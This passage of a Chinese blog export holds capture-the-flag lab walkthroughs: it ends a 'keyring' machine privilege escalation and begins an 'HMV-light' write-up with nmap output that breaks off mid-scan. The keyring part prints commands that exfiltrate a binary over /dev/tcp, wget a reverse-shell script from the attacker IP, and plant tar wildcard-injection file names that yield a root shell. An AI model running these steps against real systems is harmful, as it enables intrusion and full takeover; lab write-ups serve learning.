<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>sudp -l</span><br><span class="line"></span><br><span class="line"><span class="title class_">Command</span> <span class="string">&#x27;sudp&#x27;</span> <span class="keyword">not</span> found, did you <span class="symbol">mean:</span></span><br><span class="line"></span><br><span class="line">  command <span class="string">&#x27;ssdp&#x27;</span> from snap ssdp</span><br><span class="line">  command <span class="string">&#x27;sfdp&#x27;</span> from deb graphviz</span><br><span class="line">  command <span class="string">&#x27;sup&#x27;</span> from deb sup</span><br><span class="line">  command <span class="string">&#x27;sudo&#x27;</span> from deb sudo</span><br><span class="line">  command <span class="string">&#x27;sudo&#x27;</span> from deb sudo-ldap</span><br><span class="line"></span><br><span class="line"><span class="title class_">See</span> <span class="string">&#x27;snap info &lt;snapname&gt;&#x27;</span> <span class="keyword">for</span> additional versions.</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>sudo -l</span><br><span class="line"></span><br><span class="line"><span class="title class_">We</span> trust you have received the usual lecture from the local <span class="title class_">System</span></span><br><span class="line"><span class="title class_">Administrator</span>. <span class="title class_">It</span> usually boils down to these three <span class="symbol">things:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> www-<span class="symbol">data:</span> </span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line"><span class="symbol">sudo:</span> <span class="number">1</span> incorrect password attempt</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-<span class="number">1</span>/polkit-agent-helper-<span class="number">1</span></span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>去home目录下面，发现有一个john用户，刚才sqlmap也有这个用户！<br>可以切换到这个用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/</span><span class="variable">$ </span>cd home</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">john</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/home</span><span class="variable">$ </span>su - john</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line"><span class="title class_">To</span> run a command as administrator (user <span class="string">&quot;root&quot;</span>), <span class="keyword">use</span> <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line"><span class="title class_">See</span> <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>发现john自己目录下的一个文件有suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">john<span class="variable">@keyring</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/john</span><span class="regexp">/compress</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/snapd</span><span class="regexp">/snap-confine</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/x</span>86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/policykit-1/polkit</span>-agent-helper-<span class="number">1</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/traceroute</span>6.iputils</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newuidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/pkexec</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/bin/ntfs</span>-<span class="number">3</span>g</span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/ping</span></span><br><span class="line"><span class="regexp">/bin/fusermount</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br></pre></td></tr></table></figure></div>
<p>这个是个可执行文件，但是我又卡住了<br>看了视频，知道用string看这个文件就可以了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234 &gt; compress</span></span><br><span class="line"></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>cat compress &gt; /dev/tcp/<span class="number">192.168</span>.<span class="number">240.11</span>/<span class="number">1234</span></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># strings compress             </span></span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64</span>.so.<span class="number">2</span></span><br><span class="line">libc.so.<span class="number">6</span></span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line"><span class="title class_">GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u+<span class="title class_">UH</span></span><br><span class="line">[]A\A]A^<span class="title class_">A_</span></span><br><span class="line">/bin/tar cf archive.tar *</span><br><span class="line"><span class="symbol">:*</span><span class="number">3</span><span class="variable">$&quot;</span></span><br><span class="line"><span class="symbol">GCC:</span> (<span class="title class_">Ubuntu</span> <span class="number">9.3</span>.<span class="number">0</span><span class="number">-17</span>ubuntu1~<span class="number">20.04</span>) <span class="number">9.3</span>.<span class="number">0</span></span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.<span class="number">8060</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">tar.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">system<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__libc_start_main<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setgid<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__cxa_finalize<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.<span class="title class_">ABI</span>-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure></div>
<p>主要是用到了<code>/bin/tar cf archive.tar *</code> 我们运行之后目录下就会出现archive.tar<br>在gifobins找到利用方式<br><img src="https://pic1.imgdb.cn/item/67a4c7dbd0e0a243d4fc5424.png"><br>创建两个文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">240.11</span>/reverse.sh </span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>touch -- <span class="string">&quot;--checkpoint=1&quot;</span></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>touch -- <span class="string">&quot;--checkpoint-action=exec=bash  reverse.sh&quot;</span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234           </span></span><br><span class="line">id</span><br><span class="line"><span class="title class_">To</span> run a command as administrator (user <span class="string">&quot;root&quot;</span>), <span class="keyword">use</span> <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line"><span class="title class_">See</span> <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">root<span class="variable">@keyring</span><span class="symbol">:~</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">108</span>(lxd),<span class="number">113</span>(lpadmin),<span class="number">114</span>(sambashare),<span class="number">1000</span>(john)</span><br><span class="line">root<span class="variable">@keyring</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>了解了这里–是告诉touch后面不是参数，不用识别因为文件中带–</p>
<p>总结：这个靶机我卡了好久，也算学了不少东西，以后都用gobuster扫目录，学了wfuzz爆破参数，源码泄漏使用git log和git diff找出历史版本的不同。最后提权稍微修改下poc就可以了</p>
<p>群主复盘视频地址：<a href="https://www.bilibili.com/video/BV17iP6eLEP2/?spm_id_from=333.1387.upload.video_card.click&vd_source=2971771be3c690f4dabe696dc01299f2">https://www.bilibili.com/video/BV17iP6eLEP2/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=2971771be3c690f4dabe696dc01299f2</a></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-light</title>
    <url>/posts/32688.html</url>
    <content><![CDATA[<p>HMV-light靶机复盘</p>
<span id="more"></span>
<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A -p- 192.168.112.81</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">22</span> <span class="number">18</span>:<span class="number">04</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.81</span>)</span><br><span class="line">Host is up (<span class="number">0.0022</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>    open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">93</span>:a4:<span class="number">92</span>:<span class="number">55</span>:<span class="number">72</span>:<span class="number">2</span>b:<span class="number">9</span>b:<span class="number">4</span>a:<span class="number">52</span>:<span class="number">66</span>:<span class="number">5</span>c:af:a9:<span class="number">83</span>:<span class="number">3</span>c:fd (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">1</span>e:a7:<span class="number">44</span>:<span class="number">0</span>b:<span class="number">2</span>c:<span class="number">1</span>b:<span class="number">0</span>d:<span class="number">77</span>:<span class="number">83</span>:df:<span class="number">1</span>d:<span class="number">9</span>f:<span class="number">0</span>e:<span class="number">30</span>:<span class="number">08</span>:<span class="number">4</span>d (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d0:fa:<span class="number">9</span>d:<span class="number">76</span>:<span class="number">77</span>:<span class="number">42</span>:<span class="number">6</span>f:<span class="number">91</span>:d3:bd:b5:<span class="number">44</span>:<span class="number">72</span>:a7:c9:<span class="number">71</span> (ED25519)</span><br><span class="line"><span class="number">49091</span><span class="symbol">/tcp</span> open  unknown</span><br><span class="line">| <span class="params">fingerprint-strings:</span> </span><br><span class="line">|   GenericLines, <span class="params">NULL:</span> </span><br><span class="line">|     <span class="number">00000000</span>: <span class="number">8950</span> <span class="number">4</span>e47 <span class="number">0</span>d0a <span class="number">1</span>a0a <span class="number">0000</span> <span class="number">000</span>d <span class="number">4948</span> <span class="number">4452</span> .PNG........IHDR</span><br><span class="line">|     <span class="number">00000010</span>: <span class="number">0000</span> <span class="number">013</span>f <span class="number">0000</span> <span class="number">0085</span> <span class="number">0806</span> <span class="number">0000</span> <span class="number">002</span>d <span class="number">80</span>ff ...<span class="operator">?</span>.........-..</span><br><span class="line">|     <span class="number">00000020</span>: <span class="number">0</span>c00 <span class="number">0000</span> <span class="number">0173</span> <span class="number">5247</span> <span class="number">4200</span> aece <span class="number">1</span>ce9 <span class="number">0000</span> .....sRGB.......</span><br><span class="line">|     <span class="number">00000030</span>: <span class="number">0004</span> <span class="number">6741</span> <span class="number">4</span>d41 <span class="number">0000</span> b18f <span class="number">0</span>bfc <span class="number">6105</span> <span class="number">0000</span> ..gAMA......a...</span><br><span class="line">|     <span class="number">00000040</span>: <span class="number">0009</span> <span class="number">7048</span> <span class="number">5973</span> <span class="number">0000</span> <span class="number">0</span>ec3 <span class="number">0000</span> <span class="number">0</span>ec3 <span class="number">01</span>c7 ..pHYs..........</span><br><span class="line">|     <span class="number">00000050</span>: <span class="number">6</span>fa8 <span class="number">6400</span> <span class="number">0007</span> de49 <span class="number">4441</span> <span class="number">5478</span> <span class="number">5</span>eed dbf7 o.d....IDATx^...</span><br><span class="line">|     <span class="number">00000060</span>: <span class="number">9314</span> <span class="number">4518</span> c671 ffff <span class="number">1</span>f2d ab2c <span class="number">73</span>c0 <span class="number">9</span>cb0 ..E..q...-.,s...</span><br><span class="line">|     <span class="number">00000070</span>: <span class="number">0</span>c08 <span class="number">7292</span> <span class="number">0491</span> <span class="number">2092</span> <span class="number">8380</span> <span class="number">08</span>e2 <span class="number">09</span>ca c1a1 ..r... .........</span><br><span class="line">|     <span class="number">00000080</span>: <span class="number">2248</span> <span class="number">7</span>aed c799 <span class="number">2</span>ea7 a67a <span class="number">6</span>f7b c3ed edf2 <span class="string">&quot;Hz......zo&#123;....</span></span><br><span class="line"><span class="string">|     00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400 |?US.&#125;...a....T.</span></span><br><span class="line"><span class="string">|     000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f .!...%...%...%..</span></span><br><span class="line"><span class="string">|     000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..</span></span><br><span class="line"><span class="string">|     000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..</span></span><br><span class="line"><span class="string">|_    000000d0: 8025 c</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port49091-TCP:V=7.95%I=7%D=2/22%Time=67B9A146%P=aarch64-unknown-linux-g</span></span><br><span class="line"><span class="string">SF:nu%r(NULL,234D,&quot;</span><span class="number">00000000</span>:\x208950\x204e47\x200d0a\x201a0a\x200000\x2000</span><br><span class="line">SF:<span class="number">0</span>d\x204948\x204452\x20\x20\.PNG\.\.\.\.\.\.\.\.IHDR\n00000010:\x200000\</span><br><span class="line">SF:x20013f\x200000\x200085\x200806\x200000\x20002d\x2080ff\x20\x20\.\.\.\<span class="operator">?</span></span><br><span class="line">SF:\.\.\.\.\.\.\.\.\.-\.\.\n00000020:\x200c00\x200000\x200173\x205247\x204</span><br><span class="line">SF:<span class="number">200</span>\x20aece\x201ce9\x200000\x20\x20\.\.\.\.\.sRGB\.\.\.\.\.\.\.\n000000</span><br><span class="line">SF:<span class="number">30</span>:\x200004\x206741\x204d41\x200000\x20b18f\x200bfc\x206105\x200000\x20</span><br><span class="line">SF:\x20\.\.gAMA\.\.\.\.\.\.a\.\.\.\n00000040:\x200009\x207048\x205973\x200</span><br><span class="line">SF:<span class="number">000</span>\x200ec3\x200000\x200ec3\x2001c7\x20\x20\.\.pHYs\.\.\.\.\.\.\.\.\.\.</span><br><span class="line">SF:\n00000050:\x206fa8\x206400\x200007\x20de49\x204441\x205478\x205eed\x20</span><br><span class="line">SF:dbf7\x20\x20o\.d\.\.\.\.IDATx\^\.\.\.\n00000060:\x209314\x204518\x20c67</span><br><span class="line">SF:<span class="number">1</span>\x20ffff\x201f2d\x20ab2c\x2073c0\x209cb0\x20\x20\.\.E\.\.q\.\.\.-\.,s\</span><br><span class="line">SF:.\.\.\n00000070:\x200c08\x207292\x200491\x202092\x208380\x2008e2\x2009c</span><br><span class="line">SF:a\x20c1a1\x20\x20\.\.r\.\.\.\x20\.\.\.\.\.\.\.\.\.\n00000080:\x202248\x</span><br><span class="line">SF:<span class="number">207</span>aed\x20c799\x202ea7\x20a67a\x206f7b\x20c3ed\x20edf2\x20\x20\<span class="string">&quot;Hz<span class="char escape_">\.</span><span class="char escape_">\.</span>\</span></span><br><span class="line"><span class="string">SF:.<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>zo&#123;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000090:<span class="char escape_">\x</span>207c3f<span class="char escape_">\x</span>205553<span class="char escape_">\x</span>201c7d<span class="char escape_">\x</span>20bdd3<span class="char escape_">\x</span>20d361<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:209f09<span class="char escape_">\x</span>20bbf7<span class="char escape_">\x</span>205400<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\|</span><span class="char escape_">\?</span>US<span class="char escape_">\.</span>&#125;<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>a<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>T<span class="char escape_">\.</span><span class="char escape_">\n</span>000000a0:<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:08021<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span></span></span><br><span class="line"><span class="string">SF:!<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000b0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000</span></span><br><span class="line"><span class="string">SF:000c0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c20f\</span></span><br><span class="line"><span class="string">SF:x20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>%<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>000000d0:<span class="char escape_">\x</span>208025<span class="char escape_">\x</span>20c&quot;</span>)%r(Generic</span><br><span class="line">SF:Lines,<span class="number">234</span>D,<span class="string">&quot;00000000:<span class="char escape_">\x</span>208950<span class="char escape_">\x</span>204e47<span class="char escape_">\x</span>200d0a<span class="char escape_">\x</span>201a0a<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20000d<span class="char escape_">\x</span></span></span><br><span class="line"><span class="string">SF:204948<span class="char escape_">\x</span>204452<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span>PNG<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>IHDR<span class="char escape_">\n</span>00000010:<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200</span></span><br><span class="line"><span class="string">SF:13f<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200085<span class="char escape_">\x</span>200806<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20002d<span class="char escape_">\x</span>2080ff<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\?</span><span class="char escape_">\.</span><span class="char escape_">\.</span></span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>-<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000020:<span class="char escape_">\x</span>200c00<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200173<span class="char escape_">\x</span>205247<span class="char escape_">\x</span>204200\</span></span><br><span class="line"><span class="string">SF:x20aece<span class="char escape_">\x</span>201ce9<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>sRGB<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000030:\</span></span><br><span class="line"><span class="string">SF:x200004<span class="char escape_">\x</span>206741<span class="char escape_">\x</span>204d41<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20b18f<span class="char escape_">\x</span>200bfc<span class="char escape_">\x</span>206105<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\.</span><span class="char escape_">\.</span>gAMA<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>a<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000040:<span class="char escape_">\x</span>200009<span class="char escape_">\x</span>207048<span class="char escape_">\x</span>205973<span class="char escape_">\x</span>200000\</span></span><br><span class="line"><span class="string">SF:x200ec3<span class="char escape_">\x</span>200000<span class="char escape_">\x</span>200ec3<span class="char escape_">\x</span>2001c7<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20<span class="char escape_">\.</span><span class="char escape_">\.</span>pHYs<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00</span></span><br><span class="line"><span class="string">SF:000050:<span class="char escape_">\x</span>206fa8<span class="char escape_">\x</span>206400<span class="char escape_">\x</span>200007<span class="char escape_">\x</span>20de49<span class="char escape_">\x</span>204441<span class="char escape_">\x</span>205478<span class="char escape_">\x</span>205eed<span class="char escape_">\x</span>20dbf7</span></span><br><span class="line"><span class="string">SF:<span class="char escape_">\x</span>20<span class="char escape_">\x</span>20o<span class="char escape_">\.</span>d<span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span>IDATx<span class="char escape_">\^</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\.</span><span class="char escape_">\n</span>00000060:<span class="char escape_">\x</span>209314<span class="char escape_">\x</span>204518<span class="char escape_">\x</span>20c671<span class="char escape_">\x</span>2</span></span><br><span class="line"><span class="string">SF:0ffff<span class="char escape_">\x</span>201f2d<span class="char 